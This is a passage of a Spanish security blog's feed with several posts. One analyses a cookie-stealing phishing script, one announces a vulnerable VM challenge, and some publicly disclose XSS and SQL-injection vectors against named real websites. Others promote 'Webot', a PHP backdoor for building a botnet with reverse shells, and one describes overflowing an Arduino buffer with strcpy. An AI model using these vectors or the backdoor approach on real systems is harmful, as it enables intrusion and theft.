center;"><br /></div>Luego de llegar a un punto realmente interesante en el funcionamiento de este script malicioso decidí mirar los archivos Javascript ya que todo esto era posible gracias a peticiones ajax.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-I7u1adwsfNg/VVLdxAq-5AI/AAAAAAAAAg8/Kc-dG-8sUas/s1600/js.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="360" src="http://1.bp.blogspot.com/-I7u1adwsfNg/VVLdxAq-5AI/AAAAAAAAAg8/Kc-dG-8sUas/s640/js.png" width="640" /></a></div><div style="text-align: center;"><br /></div><br />Al ver un poco ambos archivos notamos otra coincidencia, nuestro programador es de habla latina, igual que <b>Dario Lopez</b>, y podemos ver con este trozo de código como evalúa el estado de nuestra session por medio de cookies.</div><div style="text-align: left;"><br /><div style="text-align: center;"></div><div style="text-align: center;"><a href="http://4.bp.blogspot.com/-umkOy0Ehsiw/VVLeO8hVuwI/AAAAAAAAAhE/bVnq6gjEDCM/s1600/malcookiecaptcher.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="116" src="http://4.bp.blogspot.com/-umkOy0Ehsiw/VVLeO8hVuwI/AAAAAAAAAhE/bVnq6gjEDCM/s640/malcookiecaptcher.png" width="640" /></a> </div><div style="text-align: left;"><br />Dentro del otro fichero javascript es donde la cosa se pone un poco peligrosa.<br /><br />En el siguiente código podemos ver como el script roba nuestras cookies para luego enviarlas muy probablemente a un panel de administración.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-QJ6JXog6uc4/VVLetATWgxI/AAAAAAAAAhQ/0GM0cZXPHCE/s1600/obtiene%2Bnuestra%2Bcookie.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="132" src="http://2.bp.blogspot.com/-QJ6JXog6uc4/VVLetATWgxI/AAAAAAAAAhQ/0GM0cZXPHCE/s640/obtiene%2Bnuestra%2Bcookie.png" width="640" /></a></div><div style="text-align: center;"><br /></div>Entre los datos que obtiene el atacante se encuentra:&nbsp;</div><div style="text-align: left;"><br /><b>Fecha en la que expira nuestra session</b> (para los que pinchan en "iniciar automáticamente")<br /><b>El path</b> desde donde se pincho el link malicioso<br /><b>El dominio</b> en nuestro caso <b>www.facebook.com</b><br /><b>Secure</b> que de momentos la almacena en blanco.<br /><br />Luego de intentar&nbsp; acceder un tiempo a wppanel.php decidí que era tiempo de eliminar las Sessiones de mi navegador, limpiar las Cookies y eliminar cache.</div><div style="text-align: left;">Nadie quiere un Bot JS persistente en el navegador como el desarrollado por nuestro amigo <b>Chema</b> en:<br /><br /><a href="http://www.elladodelmal.com/2012/03/owning-bad-guys-mafia-with-javascript.html">http://www.elladodelmal.com/2012/03/owning-bad-guys-mafia-with-javascript.html</a><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-qVlkpkftoNI/VVLp83dTIiI/AAAAAAAAAio/PL2cjYAYPcQ/s1600/limpiarMal.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="360" src="http://1.bp.blogspot.com/-qVlkpkftoNI/VVLp83dTIiI/AAAAAAAAAio/PL2cjYAYPcQ/s640/limpiarMal.png" width="640" /></a></div><div style="text-align: center;"><br /></div><div style="text-align: left;">Luego de esto pasamos a enviar solicitudes de análisis a sitios como VirusTotal y demás sitios web que repartan muestras de malware a distintas compañías con el fin de intentar quemar lo mas rápido posible este Script Malicioso.<br /><br /><div style="text-align: right;"><b>Si más, espero que les haya gustado esta lectura. Saludos!</b></div><br />Demás esta decir que tengan cuidado al abrir cualquier link que venga desde el sitio <b>http://enminutos.do</b><br /><br />Por si quieren analizar ustedes también <br />Pastebin del html: <a href="http://pastebin.com/Zg5phGGq">http://pastebin.com/Zg5phGGq</a><br /><br /><b>Actualización:</b> Un amigo lector de este blog, envío un email relacionando el funcionamiento relatado con el siguiente script a la venta en distintas zonas y foros. Según parece programado y a la venta por el usuario <b>gere88</b> de <b>foroBeta</b>.<br /><br /><b>Gere88</b> buen trabajo!<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-4jtw3Nrp0WQ/VVktImiRpTI/AAAAAAAAAjI/gbAlxeHhxLU/s1600/aaa.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="640" src="http://3.bp.blogspot.com/-4jtw3Nrp0WQ/VVktImiRpTI/AAAAAAAAAjI/gbAlxeHhxLU/s640/aaa.png" width="507" /></a></div><div style="text-align: center;"><br /></div><br /></div></div></div>]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Darknet 1.0]]></title>
    <link href="http://securitysignal.github.io/blog/2015/04/29/darknet-10/"/>
    <updated>2015-04-29T10:49:00-07:00</updated>
    <id>http://securitysignal.github.io/blog/2015/04/29/darknet-10</id>
    <content type="html"><![CDATA[<div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-1XTvGWm6f6k/VUEXT6geJ9I/AAAAAAAAAeo/SVJQc8tykLo/s1600/darknet.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-1XTvGWm6f6k/VUEXT6geJ9I/AAAAAAAAAeo/SVJQc8tykLo/s1600/darknet.png" height="213" width="400" /></a></div><br /><b>By [Q]3rV[0]</b> <br /><br />La persistencia bloguera no es mi fuerte y ya hacia rato que no publicaba nada<br />nuevo, de a lapsos durante el tiempo libre me vi enfocado a la creación de una<br />nueva <b>VM</b> que pudiera ser digna del nivel de <b>#Vulnhub</b>, creo que me acerque lo<br />mas que pude, nació así Darknet, una maquina virtual vulnerable para el <br /><a name='more'></a>desarrollo de laboratorios <b>100% Secsignal!</b>.<br /><br /><h2><b><span style="font-weight: normal;">Que nos tiene preparado Darknet?</span></b></h2><br />No me gusta hacer spoiler y sobre todo de un reto de estas características, así que voy a tratar de ser lo mas escaso posible al tratar de describirla. <b>Darknet</b> tiene un poco de todo, una salsa con un toque de enrosque y frustración que espero lleve horas de migrañas y diversión para el que se atreva a conquistar sus aposentos. <br />Como se acostumbra el objetivo sera leer el contenido del fichero <b>/root/flag.txt</b>, obviamente una vez escalado los privilegios necesarios para cumplir con el cometido.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-HbR-HWrLRU8/VUEXntXVljI/AAAAAAAAAew/5AW2x2DK-Nk/s1600/drknedssd.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-HbR-HWrLRU8/VUEXntXVljI/AAAAAAAAAew/5AW2x2DK-Nk/s1600/drknedssd.png" height="292" width="640" /></a></div><br /><br />La imagen podrán montarla con <b>VirtualBox</b>. La maquina posee <b>DHCP</b> activo así que una vez lista asignara automaticamente una ip de red, el paso siguiente sera identificar el objetivo y&nbsp; descubrir <b>el/los servicio/s</b> para que comience el juego. Buena suerte!.<br /><br />Si desean enviar sus solucionarios en formato pdf pueden hacerlo a la siguiente dirección: <b>s3csignal[at]gmail[dot]com</b><br /><br /><br /><a href="http://www.mediafire.com/download/c7j67ezi61e4ozz/Darknet.rar" target="_blank">DESCARGAR DARKNET 1.0</a>]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[XSS https://www.clickon.com.ar]]></title>
    <link href="http://securitysignal.github.io/blog/2015/04/18/xss-httpswwwclickoncomar/"/>
    <updated>2015-04-18T17:02:00-07:00</updated>
    <id>http://securitysignal.github.io/blog/2015/04/18/xss-httpswwwclickoncomar</id>
    <content type="html"><![CDATA[<div style="text-align: left;"><div class="separator" style="clear: both; text-align: center;"></div><div style="text-align: center;"><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-fiqKeorE6V0/VTLwdPIh2qI/AAAAAAAAAeQ/l-FfqBNK_X0/s1600/clickONXSS.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-fiqKeorE6V0/VTLwdPIh2qI/AAAAAAAAAeQ/l-FfqBNK_X0/s1600/clickONXSS.png" height="358" width="640" /></a></div><br /></div><br />Todos los sitios expuestos en esta sección han sido reportados y  hemos ofrecido nuestro servicios para lograr solucionar las fallas de  seguridad en sus sistemas,<br /><a name='more'></a> si estos fallos siguen vigentes es por puro  desinterés y mala administración de los encargados. <br /><br />XSS Double Encode<br /><br />Sitio: <a href="https://www.clickon.com.ar/">https://www.clickon.com.ar</a><br /><br />Vector:<br /><br /><a href="https://www.clickon.com.ar/busca/%253Cscript%253Ealert%2528%2527hdbreaker%2527%2529%253C%252fscript%253E?searchByCity=1&amp;showQuery=1&amp;searchFrom=box">https://www.clickon.com.ar/busca/%253Cscript%253Ealert%2528%2527hdbreaker%2527%2529%253C%252fscript%253E?searchByCity=1&amp;showQuery=1&amp;searchFrom=box</a></div><div style="text-align: left;"><br />Autor: hdbreaker</div>]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SQLI http://www.isecom.com.ar]]></title>
    <link href="http://securitysignal.github.io/blog/2015/04/17/sqli-httpwwwisecomcomar/"/>
    <updated>2015-04-17T12:53:00-07:00</updated>
    <id>http://securitysignal.github.io/blog/2015/04/17/sqli-httpwwwisecomcomar</id>
    <content type="html"><![CDATA[<div style="text-align: left;"><div style="text-align: center;"><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-1lzWi5eus9k/VTFkJBY1X5I/AAAAAAAAAd8/dJzRXKlQfDc/s1600/isecom.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-1lzWi5eus9k/VTFkJBY1X5I/AAAAAAAAAd8/dJzRXKlQfDc/s1600/isecom.png" height="356" width="640" /></a></div><br /></div><br />Todos los sitios expuestos en esta sección han sido reportados y  hemos ofrecido nuestro servicios para lograr solucionar las fallas de  seguridad en sus sistemas,<br /><a name='more'></a> si estos fallos siguen vigentes es por puro  desinterés y mala administración de los encargados. <br /><br />SQLI<br /><br />Sitio: <a href="http://www.isecom.com.ar/noticias_int.php?id=%2752">http://www.isecom.com.ar/noticias_int.php?id='52</a><a href="https://www.bebee.com/"></a></div><div style="text-align: left;"><br />Autor: hdbreaker<br /><br />Este  fallo fue reportado sin respuesta por parte de la empresa, fueron  informados varias veces y no se han tomado la molestia de responder ningún  correo lo que deja que hablar de los desarrolladores del sistema al no interesarse por corregir un fallo que pone en riesgo los datos privados de las empresas que confían en su sistema.</div>]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[XSS www.bebee.com]]></title>
    <link href="http://securitysignal.github.io/blog/2015/04/17/xss-wwwbebeecom/"/>
    <updated>2015-04-17T12:48:00-07:00</updated>
    <id>http://securitysignal.github.io/blog/2015/04/17/xss-wwwbebeecom</id>
    <content type="html"><![CDATA[<div style="text-align: left;"><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/--5xw8Lria04/VTFjg5UvCUI/AAAAAAAAAd0/pGbYGeadc4Y/s1600/xssbeBee.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/--5xw8Lria04/VTFjg5UvCUI/AAAAAAAAAd0/pGbYGeadc4Y/s1600/xssbeBee.png" height="358" width="640" /></a></div><div style="text-align: center;"><br /></div><br />Todos los sitios expuestos en esta sección han sido reportados y  hemos ofrecido nuestro servicios para lograr solucionar las fallas de  seguridad en sus sistemas,<br /><a name='more'></a> si estos fallos siguen vigentes es por puro  desinterés y mala administración de los encargados. <br /><br />XSS<br /><br />Sitio: <a href="https://www.bebee.com/">https://www.bebee.com/</a><a href="http://www.icbc.com.ar/"></a><br /><br />Vector: <br />Searcher: &lt;script&gt;alert('hdbreaker')&lt;/script&gt;</div><div style="text-align: left;"><br />Autor: hdbreaker<br /><br />Este fallo fue reportado sin respuesta por parte de la empresa, fueron informados 3 veces y no se han tomado la molestia de responder ningún correo lo que deja que hablar de los desarrolladores del sistema. Doy por positivo que el fallo a sido fixeado (Por fin)</div>]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Webot Release!]]></title>
    <link href="http://securitysignal.github.io/blog/2015/04/08/webot-release/"/>
    <updated>2015-04-08T09:03:00-07:00</updated>
    <id>http://securitysignal.github.io/blog/2015/04/08/webot-release</id>
    <content type="html"><![CDATA[<div style="text-align: center;"><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://www.techweekeurope.co.uk/wp-content/uploads/2011/06/Botnet.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://www.brightwings.co.nz/wp-content/uploads/2012/04/butterfly-release.jpg" height="244" width="400" /></a> </div><div style="text-align: right;"><b>by hdbreaker</b> </div><div style="text-align: left;"></div><br /><div style="text-align: left;"><div style="text-align: center;"><h2><b><span class="st">¡</span>Webot Release!</b></h2></div></div><div style="text-align: center;">Por fin después de varios meses de testing hemos logrado terminar una versión</div><div style="text-align: center;">estable de Webot y la hemos incluido de forma <br /><a name='more'></a>OpenSource en nuestro repositorio de frameshock!</div><br /><b>Si quieres ver algo crecer, déjalo ser libre</b><br /><div style="text-align: center;"><h2>¿Como Funciona?</h2></div><div style="text-align: left;"></div><div style="text-align: left;"></div><div style="text-align: left;"><b>Webot</b> da la posibilidad de crear un payload especial protegido por contraseña que debe inyectarse en cualquier archivo php dentro del servidor.</div><div style="text-align: left;"><br />Este payload funciona de forma OnDemand, lo que quiere decir que cuando el titiritero solicite al Zombie privilegios este le responderá, pero mientras no sea necesario el Zombie no despertara ninguna actitud sospechosa quedando dormido pero residente.<br /><br />Una vez hecho esto solo queda gestionar los Zombies desde el modulo <b>Webot</b> de <b>Frameshock</b> que permite el envío individual o masivo de comando a los Zombies. <br /><br />Ademas de esto <b>Webot</b> ofrece la posibilidad de solicitar un Reverse Shell a los Zombies, tanto a un Bot especifico como a toda la Mesh de Bots.<br /><br /></div><div style="text-align: left;"></div><div style="text-align: left;"><div style="text-align: center;"><br /><a href="http://3.bp.blogspot.com/-vujy0UM7q6Q/VPe_jN7XrlI/AAAAAAAAAbU/H5LE6suMWH4/s1600/main.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-vujy0UM7q6Q/VPe_jN7XrlI/AAAAAAAAAbU/H5LE6suMWH4/s1600/main.png" height="275" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-j-ryWknopgA/VPe_ieu9rcI/AAAAAAAAAbA/EpeEic0KcCk/s1600/cmd.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-j-ryWknopgA/VPe_ieu9rcI/AAAAAAAAAbA/EpeEic0KcCk/s1600/cmd.png" height="265" width="640" /></a></div></div><div style="text-align: center;"><a href="http://3.bp.blogspot.com/-lom6f5K_KoI/VPe_ijafRlI/AAAAAAAAAbI/d4XQ2k4eVG4/s1600/generate.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-lom6f5K_KoI/VPe_ijafRlI/AAAAAAAAAbI/d4XQ2k4eVG4/s1600/generate.png" height="288" width="640" /></a></div><div style="text-align: left;"></div><div style="text-align: left;"><div style="text-align: center;"><a href="http://1.bp.blogspot.com/-lwPsAijUq0A/VPe_iNIRn8I/AAAAAAAAAa4/QGD8jh15Z8w/s1600/bot.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-lwPsAijUq0A/VPe_iNIRn8I/AAAAAAAAAa4/QGD8jh15Z8w/s1600/bot.png" height="128" width="640" /></a><a href="http://1.bp.blogspot.com/-o7Zrd3ovDIk/VPe_icBgcxI/AAAAAAAAAa8/fuRHMeFGsBs/s1600/exploit.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-o7Zrd3ovDIk/VPe_icBgcxI/AAAAAAAAAa8/fuRHMeFGsBs/s1600/exploit.png" height="116" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-p1q-t53dSlc/VPe_ixw5-QI/AAAAAAAAAbM/_eRbrlUEwek/s1600/handler.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-p1q-t53dSlc/VPe_ixw5-QI/AAAAAAAAAbM/_eRbrlUEwek/s1600/handler.png" height="435" width="640" /></a></div><br /><br /><br /><br /><br /><br /></div></div>]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Webot - One Ring to Control the Others ]]></title>
    <link href="http://securitysignal.github.io/blog/2015/03/04/webot-one-ring-to-control-others/"/>
    <updated>2015-03-04T18:32:00-08:00</updated>
    <id>http://securitysignal.github.io/blog/2015/03/04/webot-one-ring-to-control-others</id>
    <content type="html"><![CDATA[<div style="text-align: center;"><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://www.techweekeurope.co.uk/wp-content/uploads/2011/06/Botnet.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://www.techweekeurope.co.uk/wp-content/uploads/2011/06/Botnet.jpg" height="353" width="400" /></a> </div><div style="text-align: right;"><b>by hdbreaker</b> </div><div style="text-align: left;"></div><div style="text-align: left;">Alguna vez has pensado como armar tu propia Botnet?&nbsp;</div><div style="text-align: left;">Repasado internamente la planificación para dispersar Malware? <br /><a name='more'></a><br />Has pensado en armar tu propio Malware?<br /><br />Las miles de lineas de código que implica tener un Malware decente?&nbsp;</div><div style="text-align: left;">Has pensado si cuentas realmente con las skills necesarias?</div><div style="text-align: left;"></div><div style="text-align: left;"></div><div style="text-align: left;"><br />Bueno quiero comentarles un secreto a esas personas curiosas que probablemente tengan un perfil Pentester&nbsp; y no se sientan atraídas por el Malware o no ven el desarrollo de software como parte principal de sus intereses.<br /><br /><div style="text-align: center;"><h2><b>Estamos trabajando en una solución</b></h2></div></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Imagina ir realizando tus ataques, ingresando a servidores recorriendo archivos leyendo logs, intentando escalar privilegios y te encuentras con la necesidad&nbsp; de mantener el acceso de forma fiable y pasiva.</div><div style="text-align: left;"><b>Webot</b> es posible gracias a la base robusta que brinda Frameshock, se presenta como un modulo privado del mismo y viene a realizar esos deseos realidad.</div><div style="text-align: left;"></div><div style="text-align: left;">Podrás realizar tus auditorías y a medida que trabajes podrás generarte poco a poco una botnet PHP pasiva que en el momento que tu elijas te daría la posibilidad de volver activa a cada victima LINUX, gestionarla remotamente o en conjunto con todos tus zombies y hasta garantizarte reverse shell de todas tus victimas.</div><div style="text-align: left;"><br /></div><div style="text-align: center;"><h2>¿Como Funciona?</h2></div><div style="text-align: left;"></div><div style="text-align: left;"></div><div style="text-align: left;"><b>Webot</b> da la posibilidad de crear un payload especial protegido por contraseña que debe inyectarse en cualquier archivo php dentro del servidor.</div><div style="text-align: left;"><br />Este payload funciona de forma OnDemand, lo que quiere decir que cuando el titiritero solicite al Zombie privilegios este le responderá, pero mientras no sea necesario el Zombie no despertara ninguna actitud sospechosa quedando dormido pero residente.<br /><br />Una vez hecho esto solo queda gestionar los Zombies desde el modulo <b>Webot</b> de <b>Frameshock</b> que permite el envío individual o masivo de comando a los Zombies. <br /><br />Ademas de esto <b>Webot</b> ofrece la posibilidad de solicitar un Reverse Shell a los Zombies, tanto a un Bot especifico como a toda la Mesh de Bots.<br /><br />Este modulo se encuentra en desarrollo privado y se esta debatiendo la posibilidad de liberar una versión gratuita.<br /><br />De momentos los dejamos con unas capturas:</div><div style="text-align: left;"></div><div style="text-align: left;"><div style="text-align: center;"><br /><a href="http://3.bp.blogspot.com/-vujy0UM7q6Q/VPe_jN7XrlI/AAAAAAAAAbU/H5LE6suMWH4/s1600/main.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-vujy0UM7q6Q/VPe_jN7XrlI/AAAAAAAAAbU/H5LE6suMWH4/s1600/main.png" height="275" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-j-ryWknopgA/VPe_ieu9rcI/AAAAAAAAAbA/EpeEic0KcCk/s1600/cmd.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-j-ryWknopgA/VPe_ieu9rcI/AAAAAAAAAbA/EpeEic0KcCk/s1600/cmd.png" height="265" width="640" /></a></div></div><div style="text-align: center;"><a href="http://3.bp.blogspot.com/-lom6f5K_KoI/VPe_ijafRlI/AAAAAAAAAbI/d4XQ2k4eVG4/s1600/generate.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-lom6f5K_KoI/VPe_ijafRlI/AAAAAAAAAbI/d4XQ2k4eVG4/s1600/generate.png" height="288" width="640" /></a></div><div style="text-align: left;"></div><div style="text-align: left;"><div style="text-align: center;"><a href="http://1.bp.blogspot.com/-lwPsAijUq0A/VPe_iNIRn8I/AAAAAAAAAa4/QGD8jh15Z8w/s1600/bot.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-lwPsAijUq0A/VPe_iNIRn8I/AAAAAAAAAa4/QGD8jh15Z8w/s1600/bot.png" height="128" width="640" /></a><a href="http://1.bp.blogspot.com/-o7Zrd3ovDIk/VPe_icBgcxI/AAAAAAAAAa8/fuRHMeFGsBs/s1600/exploit.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-o7Zrd3ovDIk/VPe_icBgcxI/AAAAAAAAAa8/fuRHMeFGsBs/s1600/exploit.png" height="116" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-p1q-t53dSlc/VPe_ixw5-QI/AAAAAAAAAbM/_eRbrlUEwek/s1600/handler.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-p1q-t53dSlc/VPe_ixw5-QI/AAAAAAAAAbM/_eRbrlUEwek/s1600/handler.png" height="435" width="640" /></a></div><br /><br /><br /><br /><br /><br /></div></div>]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Arduino P0wn3d - Desbordando Arduino]]></title>
    <link href="http://securitysignal.github.io/blog/2015/02/26/arduino-p0wned-desbordando-arduino/"/>
    <updated>2015-02-26T23:04:00-08:00</updated>
    <id>http://securitysignal.github.io/blog/2015/02/26/arduino-p0wned-desbordando-arduino</id>
    <content type="html"><![CDATA[<div class="separator" style="clear: both; text-align: center;"><a href="http://sd.keepcalm-o-matic.co.uk/i/keep-calm-and-fuck-arduino.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://sd.keepcalm-o-matic.co.uk/i/keep-calm-and-fuck-arduino.png" height="400" width="342" /></a></div><div style="text-align: right;"><b>by hdbreaker</b></div><div style="text-align: right;"><br /></div><div style="text-align: left;">Hace bastante tiempo que con mi amigo Q3rv0 estamos estudiando a fondo los renombrados Buffer Overflow en distintas arquitecturas.<br /><a name='more'></a><br />En una charla a altas horas de la noche salio la incognita...&nbsp;</div><h2 style="text-align: center;">¿¿¿Se podra Overflodear un Arduino???</h2><div style="text-align: left;"><br />La verdad fue un gran interrogante. Como gran aficionado a la electrónica y habiendo trabajando desarrollando varios sistemas telemétricos industriales bajo la misma plataforma, no podía faltar en mi colección varios de estos increíbles aparatitos.<br /><br />El problema era el siguiente... como funciona internamente el procesador de un Arduino?<br /><br />Antes de empezar a probar decidí estudiar un poco mas en profundidad la arquitectura Harvard, en la cual se basan la mayoría de los sistemas embebidos PIC y derivados centrados en Atmel AVR.<br /><br />Lo primero a destacar de la arquitectura Harvard es que a diferencia de arquitecturas como x86 y x64, Harvard tiene 2 espacios de memoria separados, los cuales gestionan partes distintas del procesador, un sector se encarga de gestionar la sección ejecutable o de código y otra, la sección de datos no ejecutables, donde se almacenan las funcionalidades especiales del integrado donde se almacena el firmware principal o bootloader del micro controlador lo que equivaldría a root en un sistema linux!<br /><br /><div style="text-align: center;"><span style="color: red;">EXECUTABLE SPACE</span> &lt;-------------&gt; <b>CPU ATMEL</b> &lt;-------------&gt; <span style="color: red;">DATA SPACE</span></div><br />El CPU ATMEL tiene la habilidad de poder interactuar con ambos espacios de memoria a la vez y en base a las direcciones en el DATA SPACE gestionar los saltos de memoria en el EXECUTABLE SPACE (CODE SPACE)<br /><br />La idea principal era de alguna forma lograr explotar una función que no validara el largo de los buffer y de esta forma poder pisar la memoria reservada en el stack hasta sobre escribir el EIP y lograr modificar el salto del procesador a una nueva dirección de memoria donde esconderíamos algún código malicioso que se ejecutara a nivel bootloader y de esta forma conseguir nuestro "pseudo root" y lograr acceder a la habilidad de retrogravación que poseen los Arduino e intentar cargar un bootloader modificado que guardara a escondidas los valores de distintos sensores y los enviara a un servidor ftp o los escribiera en algún archivo que luego el atacante obtendría por sus propios medios.<br /><br />Lo primero a solucionar... <b>la funcion que no validara el largo de los buffer... </b>La verdad esto no fue muy dificil, ya que Arduino se basa en C para trabajar podemos utilizar la función <b>strcpy</b> sin sanitizar para lograr overflodear el stack y así lograr pisar el EIP.<br /><br />Para realizar mis pruebas realice un pequeño sketch que me permitiera analizar de forma controlada las distintas respuestas que podía observar en Arduino. <br /><br />Sketch:<br /><br /><pre class="brush: cpp">int led = 13;<br /><br />//Buffer to be Smashed<br />char bufferOUT[1];<br /><br />//Buffer Payload<br />char bufferIN[5];<br />  <br />void setup() {<br />  Serial.begin(9600);<br />  pinMode(led,OUTPUT);<br />}<br /><br />void loop() {<br />  <br />   Serial.readBytes(bufferIN, 5);<br />   // MAGIC HERE<br />   strcpy(bufferOUT,  bufferIN);<br />   // MAGIC END<br />   <br />   Serial.print(bufferOUT);<br />  <br />   //LED BLINK<br />   digitalWrite(led, HIGH);<br />   delay(500);<br />   digitalWrite(led, LOW);<br />   delay(500);<br />}<br /></pre><br /><br />Como no encontré forma de debuggear Arduino de forma remota y lograr ver que sucedía en sus llamadas a memoria me vi en la obligación de interpretar las salidas físicas que me dictaba Arduino y sacar conjeturas para saber si iba por el camino correcto.<br /><b><br />Me valí de dos grandes factores para esto:</b><br /><br />En el loop inifito de Arduino cree un simple script que hiciera parpadear un LED de forma intermitente con una diferencia de medio segundo.<br /><br />Dentro del loop agregué una llamada a la función Serial que me permitiera leer un valor ingresado por teclado del largo que yo quisiera con el fin de simular un sensor, de esta forma lograr controlar el flujo de memoria del buffer de datos enviados y lograr sobre escribir el EIP con la ayuda de <b>strcpy</b>.<br /><div style="text-align: center;"><h2><b>¿El resultado esperado?</b></h2><div style="text-align: left;"><br />Ya que no encontré forma de depurar el proceso en ejecución dentro del Atmel decidí basarme en mis conocimientos en las arquitecturas x86 y x64 y llegue a la siguiente conclusión:<br /><br /><i><b>"</b>... El procesador Atmel en algún punto realiza un PUSH con la dirección de memoria para iniciar la función que enciende el LED luego un RET donde carga el valor del siguiente salto memoria en el EIP para llamar a la función que apaga el LED, y posterior mente un POP para eliminar de la pila (stack) la función ya ejecutada para realizar el mismo proceso con la función de apagado en el loop principal</i> ...<b>"</b><br /><br />Si lograba pisar el EIP al momento de desbordar el buffer el EIP no sabría a donde saltar por lo que el programa en ejecución en Arduino colapsaría y al quedar huerfano dejaría de prender y apagar el LED.<br /><br /><b>bufferOUT[1]</b> seria el espacio reservado ínfimo en el stack que intentaría desbordar.<br /><br /><b>bufferIN[5] </b>seria mi long payload ingresado por Serial.<br /><br /><b>strcpy</b> seria el <b>CÓMPLICE</b>, la función encargada de copiar sin ningún control nuestro long payload dentro de nuestro mini buffer reservado y de esta forma lograr, con el payload correcto, destrozar el EIP.<br /><br />En este punto la incertidumbre era extrema toda la teoría indicaba que gracias al sistema de fragmentación de memoria que posee la arquitectura Hardvard seria casi imposible explotar un Buffer Overflow... sin más remedio me acomode los pantalones, me dije de aquí en adelante no hay vuelta atrás y presione el ENTER!<br /><br />Luego de algunos segundos y luego del gran parpadeo del led azul que indicaba los RX recibidos por el Arduino, justo en el momento en que el payload termino su carga, el RX azul dejo de parpadear y casi de una forma increíble para mis espectativas el <b>LED ROJO EN EL PIN 13 DEJO DE PARPADEAR!!!</b>Esto realmente era increible para mi, no pensé que esto fuera posible, de forma exitosa había logrado sobre escribir el EIP en la arquitectura HARDVARD y el arduino había quedado colapsado.<br /><br />Esto es interesante... por que es el punto de inflexión entre el EXECUTABLE SPACE Y EL DATA SPACE ya que strcpy se ejecuta del lado de EXECUTABLE SPACE, pero el EIP que regula los saltos es controlado por el DATA SPACE...<br /><br />En pocas palabras había logrado pisar un bloque de memoria fuera de mi alcance que se encontraba protegido en DATA SPACE por la arquitectura HARVARD.<br /><br />Esto pasa por que en algún momento el <b>CPU</b> debe comunicar las direcciones de memoria de la sección ejecutable sin sanitizar a la sección de datos permitiendo de alguna forma pisar los datos privativos de la sección protegida.<br /><br />La única forma de que el equipo volviera a responder fue reiniciarlo y que el bootloader se encargara de volver a cagar en la sección ejecutable el sketch.<br /><div style="text-align: center;"><h2>Bootloader el root del Atmel/PIC</h2><div style="text-align: left;"><br />Era el momento donde debía intentar ejecutar como "BOOTLOADER" alguna función utilizando la sobre escritura del EIP.<br /><br />Mi Shellcode se trataba de un código especial que realizaría un print en Serial comunicandome si tenia acceso a clases especiales heredadas para intentar lograr realizar una especie de reflections (java) y lograr ejecutar funciones privativas de bootloader.<br /><br />La estructura del Payload era la siguiente:<br /><br />NewEIP + SHELLC0DE<br /><br />Tristemente luego de muchisimos intentos y mucha lectura entendí lo que estaba pasando y por lo cual esta arquitectura es tan segura...<br /><br />El CPU Harvard permite interactuar con un sector del stack DATA SPACE que solo permite modificar memorias y punteros en relación al 